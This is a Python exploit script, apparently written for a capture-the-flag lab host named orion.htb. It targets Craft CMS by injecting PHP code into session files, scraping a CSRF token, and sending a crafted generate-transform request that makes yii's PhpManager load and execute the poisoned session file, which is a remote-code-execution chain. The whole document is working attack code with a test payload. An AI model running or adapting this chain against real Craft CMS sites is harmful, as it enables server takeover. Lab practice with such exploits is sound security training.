import requests, urllib.parse, re, json
BASE = "http://orion.htb"
# Step 1: get/create a session via login page (to seed session files)
s = requests.Session()
login_url = f"{BASE}/admin/login"
n = s.get(login_url, timeout=20)
print("Login page status:", n.status_code)
# Try to write a webshell to a session file
# The admin pages often store the CraftSessionId in a cookie
# So after visiting any admin page, the session is stored
# Let's try to inject into a session file using an action that triggers PhpManager
# First create a normal session
inj = requests.Session()
# Visit a page that the Craft CMS uses to process redirects
# The code mentions that redirect params are processed and stored
r1 = inj.get(f"{BASE}/admin/dashboard?r=test", timeout=30, allow_redirects=False)
sid = inj.cookies.get_dict().get("CraftSessionId")
print("Direct visit sid:", sid)
# Now try to inject using the actual exploit pattern from the code
# The code shows using a GET request with a?p=admin/dashboard&a=<php>
# This might trigger some processing that creates a session file
r2 = inj.get(f"{BASE}/index.php?p=admin/dashboard&a=" + urllib.parse.quote("<?php echo 'INJECT_OK'; ?>"), timeout=30, allow_redirects=False)
sid2 = inj.cookies.get_dict().get("CraftSessionId")
print("Inject endpoint sid:", sid2)
# Check if we got a different session or the same
print("sids match?", sid == sid2)
# Now get a session (from admin/login) and CSRF token
lgs = requests.Session()
lgs.get(f"{BASE}/admin/login", timeout=20)
csrf = re.search(r'csrfTokenValue["\']?\s*[:=]\s*["\']([^"\']+)', lgs.get(f"{BASE}/admin/login", timeout=20).text).group(1)
# Trigger PhpManager with session file (if we have one)
target_sid = sid2 or sid
if target_sid:
    print("Triggering PhpManager with sess_" + target_sid)
    url = f"{BASE}/index.php?p=actions/assets/generate-transform&cmd=x"
    hdr = {"X-CSRF-Token": csrf, "Content-Type": "application/json"}
    pl = {
      "assetId": 11,
      "handle": {
        "width": 123,
        "height": 123,
        "as session": {
          "class": "craft\\behaviors\\FieldLayoutBehavior",
          "_class": "yii\\rbac\\PhpManager",
          "_construct()": [{"itemFile": f"/var/lib/php/sessions/sess_{target_sid}"}]
        }
      }
    }
    resp = lgs.post(url, data=json.dumps(pl), headers=hdr, timeout=30)
    print("Trigger status:", resp.status_code)
    print("Contains INJECT_OK?", "INJECT_OK" in resp.text)
    # If we see the session file content in the output, we know injection worked
    if "sess_" + target_sid in resp.text:
        print("Session file reference found!")
    if "Invalid" in resp.text or "error" in resp.text.lower():
        print("Error in response:", resp.text[:500])
